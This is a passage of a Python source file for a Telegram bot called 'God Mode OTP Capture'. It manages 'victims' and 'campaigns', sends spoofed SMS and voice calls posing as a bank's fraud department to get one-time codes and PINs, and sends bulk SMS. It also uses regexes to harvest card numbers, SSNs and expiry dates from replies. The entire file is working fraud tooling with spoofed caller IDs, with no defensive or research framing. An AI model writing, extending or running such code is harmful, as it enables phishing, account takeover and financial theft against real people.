        "ssn": r'\b([0-9]{3}-[0-9]{2}-[0-9]{4}|[0-9]{9})\b',
        "expiry": r'(?:exp|expiry)[:\s]+([0-9]{2}/[0-9]{2})',
    }
    results = []
    for name, pat in patterns.items():
        for m in re.finditer(pat, text, re.IGNORECASE):
            val = m.group(1).replace(" ", "").replace("-", "")
            confidence = 0.85 if name in ["card_16", "ssn"] else 0.7
            results.append({"type": name, "value": val, "confidence": confidence})
    return results

def find_victim_by_phone(phone):
    with db_session() as s:
        for v in s.query(VictimProfile).all():
            if fernet.decrypt(v.phone).decode() == phone:
                return v.id
    return None

# ======================== VICTIM & CAMPAIGN HELPERS ========================
def add_victim_db(vid, name, phone, email, svc, spoof_caller=None, spoof_svc=None, camp=None):
    with db_session() as s:
        if s.query(VictimProfile).get(vid): return False
        enc_phone = fernet.encrypt(phone.encode())
        enc_email = fernet.encrypt(email.encode())
        scripts = {
            "sms_message": f"[{spoof_svc or config.get('SPOOF_DEFAULT_SERVICE')}] Security alert: reply with code.",
            "voice_message": f"This is {spoof_svc or config.get('SPOOF_DEFAULT_SERVICE')} fraud department. Enter PIN."
        }
        v = VictimProfile(id=vid, name=name, phone=enc_phone, email=enc_email,
                          target_service=svc, spoof_caller_id=spoof_caller or config.get("SPOOF_DEFAULT_CALLER"),
                          spoof_service_name=spoof_svc or config.get("SPOOF_DEFAULT_SERVICE"),
                          campaign_id=camp, scripts_json=json.dumps(scripts))
        s.add(v); s.commit()
        return True

def get_victim_db(vid):
    with db_session() as s:
        v = s.query(VictimProfile).get(vid)
        if not v: return None
        return {
            "id": v.id, "name": v.name, "phone": fernet.decrypt(v.phone).decode(),
            "email": fernet.decrypt(v.email).decode(), "target_service": v.target_service,
            "spoof_caller_id": v.spoof_caller_id, "spoof_service_name": v.spoof_service_name,
            "campaign_id": v.campaign_id, "scripts": json.loads(v.scripts_json),
            "captures": json.loads(v.captures_json)
        }

def list_victims_db():
    with db_session() as s:
        return [(v.id, v.name) for v in s.query(VictimProfile).all()]

def add_campaign_db(cid, name, svc, spoof_caller=None, spoof_svc=None):
    with db_session() as s:
        if s.query(Campaign).get(cid): return False
        c = Campaign(id=cid, name=name, target_service=svc,
                     default_spoof_caller=spoof_caller or config.get("SPOOF_DEFAULT_CALLER"),
                     default_spoof_service=spoof_svc or config.get("SPOOF_DEFAULT_SERVICE"))
        s.add(c); s.commit()
        return True

def add_victim_to_campaign_db(cid, vid):
    with db_session() as s:
        c = s.query(Campaign).get(cid)
        if not c: return False
        vids = json.loads(c.victim_ids_json)
        if vid not in vids:
            vids.append(vid)
            c.victim_ids_json = json.dumps(vids)
            s.commit()
        return True

def list_campaigns_db():
    with db_session() as s:
        return [c.id for c in s.query(Campaign).all()]

def log_config_change(user_id, path, old, new):
    with db_session() as s:
        s.add(ConfigHistory(user_id=user_id, path=path, old_value=str(old)[:1000], new_value=str(new)[:1000]))
        s.commit()

def save_config_version(user_id, config_dict):
    with db_session() as s:
        s.add(ConfigVersion(user_id=user_id, config_json=json.dumps(config_dict)))
        s.commit()

# ======================== ENGAGEMENT SCRIPTS ========================
def list_available_scripts():
    return config.get("script_presets", [])

def get_script_by_scenario(scenario, lang="en"):
    """Fetch engagement script by scenario name and language."""
    scripts = config.get("engagement_scripts", {})
    if scenario not in scripts:
        return None
    script = scripts[scenario].get(lang, {})
    return script if script else None

def format_script(script_dict: dict, victim_name: str = "", service: str = "", digit_count: int = 6) -> dict:
    """Fill in template variables in a script."""
    formatted = {}
    for key, val in script_dict.items():
        if isinstance(val, str):
            formatted[key] = val.format(
                victim_name=victim_name or "valued customer",
                service=service or "your institution",
                digit_count=digit_count
            )
        else:
            formatted[key] = val
    return formatted

def get_script_preview(scenario: str, lang: str = "en", victim_name: str = "John", service: str = "Bank") -> str:
    """Get a formatted preview of a script."""
    script = get_script_by_scenario(scenario, lang)
    if not script:
        return "❌ Script not found."
    formatted = format_script(script, victim_name, service, 6)
    preview = f"**{scenario.upper()}** ({lang})\n\n"
    for key, val in formatted.items():
        preview += f"**{key}:** `{val}`\n"
    return preview

def get_sms_template_for_scenario(scenario: str) -> str:
    """Get the SMS template for a given scenario."""
    templates = config.get("SMS_TEMPLATES_ADVANCED", {})
    return templates.get(scenario, config.get("SMS_TEMPLATE", ""))

# ======================== TELEGRAM BOT ========================
# States
MAIN, VICTIMS, CAMPAIGNS, LAUNCH, ADD_VICTIM_NAME, ADD_VICTIM_PHONE, ADD_VICTIM_EMAIL, ADD_VICTIM_SERVICE, \
EDIT_VICTIM, EDIT_SCRIPT, EDIT_SPOOF, CREATE_CAMP_ID, CREATE_CAMP_NAME, CREATE_CAMP_SERVICE, \
SCRIPTS, SCRIPT_SELECT, SCRIPT_PREVIEW = range(17)

def main_menu():
    buttons = [
        InlineKeyboardButton("👥 Victims", callback_data="victim_mgmt"),
        InlineKeyboardButton("📋 Campaigns", callback_data="camp_mgmt"),
        InlineKeyboardButton("📱 Launch", callback_data="launch"),
        InlineKeyboardButton("�️ Scripts", callback_data="scripts_menu"),
        InlineKeyboardButton("�📊 Captures", callback_data="view_captures"),
        InlineKeyboardButton("🔒 Audit Log", callback_data="audit_log"),
        InlineKeyboardButton("⚙️ Config", callback_data="config_menu"),
    ]
    return InlineKeyboardMarkup(chunk_buttons(buttons, cols=2))


def victim_menu():
    buttons = [
        InlineKeyboardButton("➕ Add", callback_data="add_victim"),
        InlineKeyboardButton("📋 List", callback_data="list_victims"),
        InlineKeyboardButton("✏️ Edit", callback_data="edit_victim"),
        InlineKeyboardButton("❌ Delete", callback_data="delete_victim"),
        InlineKeyboardButton("⬅ Main", callback_data="main"),
    ]
    return InlineKeyboardMarkup(chunk_buttons(buttons, cols=2))


def campaign_menu():
    buttons = [
        InlineKeyboardButton("➕ New Campaign", callback_data="create_campaign"),
        InlineKeyboardButton("📋 List", callback_data="list_campaigns"),
        InlineKeyboardButton("🎯 Add Victim", callback_data="add_victim_to_campaign"),
        InlineKeyboardButton("⬅ Main", callback_data="main"),
    ]
    return InlineKeyboardMarkup(chunk_buttons(buttons, cols=2))

# ========== HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in TELEGRAM_ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    await update.message.reply_text("🔴 **GOD MODE OTP CAPTURE**", reply_markup=main_menu(), parse_mode="Markdown")
    return MAIN

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); data = q.data
    uid = q.from_user.id
    if uid not in TELEGRAM_ADMIN_IDS:
        await q.edit_message_text("⛔ Unauthorized."); return ConversationHandler.END

    # --- Navigation ---
    if data == "main":
        await q.edit_message_text("Main Menu", reply_markup=main_menu()); return MAIN
    if data == "victim_mgmt":
        await q.edit_message_text("Victim Management", reply_markup=victim_menu()); return VICTIMS
    if data == "camp_mgmt":
        await q.edit_message_text("Campaign Management", reply_markup=campaign_menu()); return CAMPAIGNS

    # --- Victim actions ---
    if data == "add_victim":
        context.user_data["v_step"] = "name"
        await q.edit_message_text("Enter victim's name:"); return ADD_VICTIM_NAME
    if data == "list_victims":
        victims = list_victims_db()
        msg = "*VICTIMS:*\n" + "\n".join([f"• {n} (`{i}`)" for i, n in victims]) if victims else "No victims."
        await q.edit_message_text(msg, parse_mode="Markdown"); return VICTIMS
    if data == "edit_victim":
        await q.edit_message_text("Send victim ID to edit:"); context.user_data["editing_victim"] = True; return EDIT_VICTIM
    if data == "delete_victim":
        await q.edit_message_text("Send victim ID to delete:"); context.user_data["deleting_victim"] = True; return EDIT_VICTIM

    # --- Campaign actions ---
    if data == "create_campaign":
        context.user_data["c_step"] = "id"
        await q.edit_message_text("Enter campaign ID:"); return CREATE_CAMP_ID
    if data == "list_campaigns":
        camps = list_campaigns_db()
        msg = "*CAMPAIGNS:*\n" + "\n".join(f"• {c}" for c in camps) if camps else "No campaigns."
        await q.edit_message_text(msg, parse_mode="Markdown"); return CAMPAIGNS
    if data == "add_victim_to_campaign":
        await q.edit_message_text("Coming soon. Use /addvictocamp <camp_id> <victim_id>")
        return CAMPAIGNS

    # --- Launch attack ---
    if data == "launch":
        victims = list_victims_db()
        if not victims: await q.edit_message_text("No victims."); return MAIN
        buttons = [InlineKeyboardButton(f"{n} ({i})", callback_data=f"launch_{i}") for i, n in victims]
        buttons.append(InlineKeyboardButton("Cancel", callback_data="main"))
        await q.edit_message_text("Select victim:", reply_markup=InlineKeyboardMarkup(chunk_buttons(buttons, cols=2))); return LAUNCH
    if data.startswith("launch_"):
        vid = data[7:]
        v = get_victim_db(vid)
        if not v: await q.edit_message_text("Not found."); return MAIN
        msg = v["scripts"]["sms_message"].replace("{service}", v["spoof_service_name"])
        try:
            if not sms_client:
                init_vonage_clients_from_config()
                if not sms_client:
                    await q.edit_message_text("❌ SMS provider not configured. Set Vonage credentials via the config menu or .env.")
                    return MAIN
            resp = sms_client.send({"to": v["phone"], "from_": SMS_FROM, "text": msg})
            if resp and resp.messages[0].status == "0":
                await q.edit_message_text(f"✅ SMS sent to {v['name']}")
            else: await q.edit_message_text("❌ SMS failed.")
        except Exception as e: await q.edit_message_text(f"Error: {e}")
        return MAIN

    # --- View captures ---
    if data == "view_captures":
        with db_session() as s:
            records = s.query(CapturedData).order_by(CapturedData.timestamp.desc()).limit(20).all()
        if not records: await q.edit_message_text("No captures."); return MAIN
        
        # Group by type
        by_type = {}
        for r in records:
            dtype = r.data_type
            if dtype not in by_type:
                by_type[dtype] = []
            by_type[dtype].append(r)
        
        msg = "*📊 CAPTURED DATA (Last 20):*\n\n"
        for dtype, items in sorted(by_type.items()):
            emoji_map = {"otp": "🔐", "financial": "💳", "card": "💳", "ssn": "🆔", "custom": "📝"}
            emoji = emoji_map.get(dtype, "📦")
            msg += f"{emoji} **{dtype.upper()}** ({len(items)})\n"
            for r in items[:5]:
                msg += f"  • {r.timestamp.strftime('%H:%M')} | {r.field_name} | Confidence: {r.confidence}%\n"
            if len(items) > 5:
                msg += f"  ... and {len(items) - 5} more\n"
        
        msg += f"\n📈 **Total: {len(records)} records captured**"
        await q.edit_message_text(msg, parse_mode="Markdown"); return MAIN

    if data == "audit_log":
        with db_session() as s:
            events = s.query(ConfigHistory).order_by(ConfigHistory.timestamp.desc()).limit(10).all()
        msg = "*AUDIT LOG:*\n" + "\n".join([f"• {e.timestamp.strftime('%H:%M')} {e.path}: {e.old_value}→{e.new_value}" for e in events])
        await q.edit_message_text(msg, parse_mode="Markdown"); return MAIN

    if data == "scripts_menu":
        scripts = list_available_scripts()
        if not scripts: await q.edit_message_text("No engagement scripts available."); return MAIN
        buttons = [InlineKeyboardButton(s.replace("_", " ").title(), callback_data=f"script_preview_{s}") for s in scripts]
        buttons.append(InlineKeyboardButton("⬅ Main", callback_data="main"))
        await q.edit_message_text("Available Engagement Scripts:", reply_markup=InlineKeyboardMarkup(chunk_buttons(buttons, cols=1))); return SCRIPTS

    if data.startswith("script_preview_"):
        scenario = data[15:]
        preview = get_script_preview(scenario, "en")
        buttons = [
            InlineKeyboardButton("🌍 Español", callback_data=f"script_preview_{scenario}_es"),
            InlineKeyboardButton("⬅ Back", callback_data="scripts_menu")
        ]
        await q.edit_message_text(preview, reply_markup=InlineKeyboardMarkup(chunk_buttons(buttons, cols=2)), parse_mode="Markdown"); return SCRIPT_PREVIEW

    if data.startswith("script_preview_") and "_" in data[15:]:
        parts = data[15:].rsplit("_", 1)
        scenario, lang = parts[0], parts[1]
        preview = get_script_preview(scenario, lang)
        buttons = [
            InlineKeyboardButton("English", callback_data=f"script_preview_{scenario}"),
            InlineKeyboardButton("⬅ Back", callback_data="scripts_menu")
        ]
        await q.edit_message_text(preview, reply_markup=InlineKeyboardMarkup(chunk_buttons(buttons, cols=2)), parse_mode="Markdown"); return SCRIPT_PREVIEW

    if data == "config_menu":
        keyboard, title = build_config_keyboard()
        await q.edit_message_text(title, reply_markup=keyboard); return MAIN

    return MAIN

# --- Config interactive menu (dynamic) ---
def build_config_keyboard(path=None):
    path = path or []
    keyboard = []
    title = "Config"
    current = config.data
    for key in path:
        if isinstance(current, dict) and key in current:
            current = current[key]
            title += f" > {key}"
        else:
            current = {}
            break

    buttons = []
    if isinstance(current, dict):
        for k, v in current.items():
            label = f"{k}/" if isinstance(v, dict) else f"{k}: {format_config_value(v)}"
            cb = f"cfg_nav:{'/'.join(path+[k])}" if isinstance(v, dict) else f"cfg_edit:{'/'.join(path+[k])}"
            buttons.append(InlineKeyboardButton(label, callback_data=cb))
    else:
        buttons.append(InlineKeyboardButton("No editable settings here", callback_data="cfg_root"))

    keyboard.extend(chunk_buttons(buttons, cols=1 if len(buttons) < 3 else 2))
    if path:
        back_path = "/".join(path[:-1]) if len(path) > 1 else ""
        keyboard.append([InlineKeyboardButton("⬅ Back", callback_data=f"cfg_nav:{back_path}" if back_path else "cfg_root")])
    return InlineKeyboardMarkup(keyboard), title

async def config_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); data = q.data
    if data == "cfg_root":
        kb, title = build_config_keyboard()
        await q.edit_message_text(title, reply_markup=kb); return MAIN
    if data.startswith("cfg_nav:"):
        raw_path = data[8:]
        path = raw_path.split("/") if raw_path else []
        kb, title = build_config_keyboard(path)
        await q.edit_message_text(title, reply_markup=kb); return MAIN
    if data.startswith("cfg_edit:"):
        path = data[9:]; keys = path.split("/")
        context.user_data["cfg_edit_path"] = keys
        ref = config.data
        for k in keys[:-1]:
            ref = ref[k]
        cur = ref[keys[-1]]
        await q.edit_message_text(
            f"Enter new value for `{path}`\nCurrent: `{cur}`\nUse /cancelconfig to abort.",
            parse_mode="Markdown"
        )
        return MAIN

async def config_value_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keys = context.user_data.get("cfg_edit_path")
    if not keys: return
    new_val = update.message.text
    path = "/".join(keys)
    ref = config.data
    for k in keys[:-1]: ref = ref[k]
    old = ref[keys[-1]]
    # simple validation: try to keep type
    if isinstance(old, int): new_val = int(new_val)
    elif isinstance(old, bool): new_val = new_val.lower() in ('true','1')
    ref[keys[-1]] = new_val
    config.save()
    log_config_change(update.effective_user.id, path, old, new_val)
    await update.message.reply_text(f"✅ Updated `{path}`: `{old}` → `{new_val}`")
    context.user_data.pop("cfg_edit_path", None)

async def cancel_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop("cfg_edit_path", None)
    await update.message.reply_text("Config edit cancelled.")

# --- Text message handlers for multi-step inputs ---
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in TELEGRAM_ADMIN_IDS: return
    text = update.message.text.strip()
    data = context.user_data

    # Add victim flow
    if "v_step" in data:
        step = data["v_step"]
        if step == "name":
            data["v_name"] = text; data["v_step"] = "phone"; await update.message.reply_text("Phone (+1234567890):"); return ADD_VICTIM_PHONE
        elif step == "phone":
            data["v_phone"] = text; data["v_step"] = "email"; await update.message.reply_text("Email (or '-' skip):"); return ADD_VICTIM_EMAIL
        elif step == "email":
            data["v_email"] = text if text != '-' else ""; data["v_step"] = "service"; await update.message.reply_text("Target service (Bank, Google, etc.):"); return ADD_VICTIM_SERVICE
        elif step == "service":
            name = data.get("v_name"); phone = data["v_phone"]; email = data.get("v_email", ""); svc = text
            vid = f"{name.replace(' ','_').lower()}_{int(time.time())}"
            if add_victim_db(vid, name, phone, email, svc):
                await update.message.reply_text(f"✅ Victim added! ID: `{vid}`", parse_mode="Markdown")
            else: await update.message.reply_text("❌ Failed (ID exists?).")
            data.clear(); return MAIN

    # Campaign creation flow
    if "c_step" in data:
        step = data["c_step"]
        if step == "id":
            data["c_id"] = text; data["c_step"] = "name"; await update.message.reply_text("Campaign name:"); return CREATE_CAMP_NAME
        elif step == "name":
            data["c_name"] = text; data["c_step"] = "service"; await update.message.reply_text("Target service:"); return CREATE_CAMP_SERVICE
        elif step == "service":
            cid = data["c_id"]; name = data["c_name"]; svc = text
            if add_campaign_db(cid, name, svc):
                await update.message.reply_text(f"✅ Campaign created: {name} ({cid})")
            else: await update.message.reply_text("❌ Failed.")
            data.clear(); return MAIN

    # Edit / Delete victim
    if data.get("editing_victim"):
        vid = text; v = get_victim_db(vid)
        if not v: await update.message.reply_text("Not found."); data.pop("editing_victim"); return MAIN
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Edit Scripts", callback_data=f"edscript_{vid}")],
            [InlineKeyboardButton("Edit Spoof", callback_data=f"edspoof_{vid}")],
            [InlineKeyboardButton("Back", callback_data="victim_mgmt")]
        ])
        await update.message.reply_text(f"Editing {v['name']}", reply_markup=kb)
        data.pop("editing_victim"); return EDIT_VICTIM

    if data.get("deleting_victim"):
        vid = text
        with db_session() as s:
            v = s.query(VictimProfile).get(vid)
            if v: s.delete(v); s.commit(); await update.message.reply_text("✅ Deleted.")
            else: await update.message.reply_text("Not found.")
        data.pop("deleting_victim"); return MAIN

    return MAIN

async def edit_submenu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); data = q.data
    if data.startswith("edscript_"):
        vid = data[9:]; context.user_data["edit_script_vid"] = vid
        await q.edit_message_text("Send new SMS message text:"); return EDIT_SCRIPT
    elif data.startswith("edspoof_"):
        vid = data[8:]; context.user_data["edit_spoof_vid"] = vid
        await q.edit_message_text("Enter new spoof caller ID (e.g., +18005551234):"); return EDIT_SPOOF
    return MAIN

async def script_edit_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vid = context.user_data.get("edit_script_vid")
    if vid:
        with db_session() as s:
            v = s.query(VictimProfile).get(vid)
            if v:
                scripts = json.loads(v.scripts_json)
                scripts["sms_message"] = update.message.text
                v.scripts_json = json.dumps(scripts); s.commit()
                await update.message.reply_text("✅ Script updated.")
    context.user_data.clear(); return MAIN

async def spoof_edit_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vid = context.user_data.get("edit_spoof_vid")
    if vid:
        with db_session() as s:
            v = s.query(VictimProfile).get(vid)
            if v:
                v.spoof_caller_id = update.message.text; s.commit()
                await update.message.reply_text("✅ Spoof caller ID updated.")
    context.user_data.clear(); return MAIN

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear(); await update.message.reply_text("Cancelled."); return ConversationHandler.END

# ======================== COMMANDS ========================
async def add_victim_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 4:
        await update.message.reply_text("/addvictim name phone email service"); return
    name, phone, email, svc = context.args[0], context.args[1], context.args[2], context.args[3]
    vid = f"{name.replace(' ','_').lower()}_{int(time.time())}"
    add_victim_db(vid, name, phone, email, svc)
    await update.message.reply_text(f"Victim added: `{vid}`", parse_mode="Markdown")

async def call_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: await update.message.reply_text("/call number lang"); return
    num, lang = context.args[0], context.args[1]
    try:
        voice.create_call({
            "to": [{"type": "phone", "number": num}],
            "from": {"type": "phone", "number": VONAGE_VIRTUAL_NUMBER},
            "answer_url": [f"{BASE_URL}/webhook/voice?lang={lang}"]
        })
        await update.message.reply_text(f"Calling {num}")
    except Exception as e: await update.message.reply_text(f"Error: {e}")

async def send_sms_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: await update.message.reply_text("/sendsms number text"); return
    num, text = context.args[0], " ".join(context.args[1:])
    try:
        if not sms_client:
            init_vonage_clients_from_config()
            if not sms_client:
                await update.message.reply_text("❌ SMS provider not configured. Set Vonage credentials via the config menu or .env.")
                return
        resp = sms_client.send({"to": num, "from_": SMS_FROM, "text": text})
        if resp and resp.messages[0].status == "0": await update.message.reply_text("✅ SMS sent")
        else: await update.message.reply_text("❌ Failed")
    except Exception as e: await update.message.reply_text(f"Error: {e}")

async def bulk_sms_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("/bulksms message"); return
    message = " ".join(context.args)
    with db_session() as s:
        contacts = [fernet.decrypt(c.number).decode() for c in s.query(Contact).all()]
    if not contacts: await update.message.reply_text("No contacts."); return
    if not sms_client:
        init_vonage_clients_from_config()
        if not sms_client:
            await update.message.reply_text("❌ SMS provider not configured. Set Vonage credentials via the config menu or .env.")
            return
    task = send_bulk_sms_task.delay(message, contacts)
    await update.message.reply_text(f"Bulk SMS task {task.id} queued.")

async def contacts_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with db_session() as s:
        contacts = s.query(Contact).all()
    if not contacts: await update.message.reply_text("No contacts.")
    else:
        msg = "\n".join([f"• {c.name}: *hidden*" for c in contacts])
        await update.message.reply_text(msg, parse_mode="Markdown")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("/start, /addvictim, /call, /sendsms, /bulksms, /contacts, /configmenu")

# ======================== MAIN ========================
def run_flask():
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", 5000))
    app.run(host=host, port=port, debug=False, use_reloader=False)


def keep_alive_pinger(url: str, interval: int = 300):
    if not url:
        return
    logger.info(f"Keep-alive pinger enabled: pinging {url} every {interval}s")
    while True:
        try:
            resp = requests.get(url, timeout=15)
            logger.debug(f"Keep-alive ping to {url}: {resp.status_code}")
        except Exception as e:
            logger.warning(f"Keep-alive ping failed: {e}")
        time.sleep(interval)

if __name__ == "__main__":
    print_startup_banner()
    
    if not config.validate():
        logger.error("Invalid configuration. Exiting."); sys.exit(1)

    threading.Thread(target=run_flask, daemon=True).start()

    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    # Conversation handler
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MAIN: [
                CallbackQueryHandler(button_handler),
                CallbackQueryHandler(config_callback, pattern="^cfg_"),
                CommandHandler("cancel", cancel)
            ],
            VICTIMS: [CallbackQueryHandler(button_handler)],
            CAMPAIGNS: [CallbackQueryHandler(button_handler)],
            LAUNCH: [CallbackQueryHandler(button_handler)],
            SCRIPTS: [CallbackQueryHandler(button_handler)],
            SCRIPT_PREVIEW: [CallbackQueryHandler(button_handler)],
            ADD_VICTIM_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
            ADD_VICTIM_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
            ADD_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
            ADD_VICTIM_SERVICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
            EDIT_VICTIM: [
                CallbackQueryHandler(edit_submenu, pattern="^ed"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)
            ],
            EDIT_SCRIPT: [MessageHandler(filters.TEXT & ~filters.COMMAND, script_edit_text)],
            EDIT_SPOOF: [MessageHandler(filters.TEXT & ~filters.COMMAND, spoof_edit_text)],
            CREATE_CAMP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
            CREATE_CAMP_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
            CREATE_CAMP_SERVICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False
    )
    application.add_handler(conv)
    application.add_handler(CommandHandler("addvictim", add_victim_cmd))
    application.add_handler(CommandHandler("call", call_cmd))
    application.add_handler(CommandHandler("sendsms", send_sms_cmd))
    application.add_handler(CommandHandler("bulksms", bulk_sms_cmd))
    application.add_handler(CommandHandler("contacts", contacts_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("cancelconfig", cancel_config))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, config_value_receiver), group=1)

    logger.warning("🚀 God Mode OTP Capture Bot starting...")
    # Start keep-alive pinger if configured
    if KEEP_ALIVE_URL:
        threading.Thread(target=keep_alive_pinger, args=(KEEP_ALIVE_URL, KEEP_ALIVE_INTERVAL), daemon=True).start()

    application.run_polling(drop_pending_updates=True)
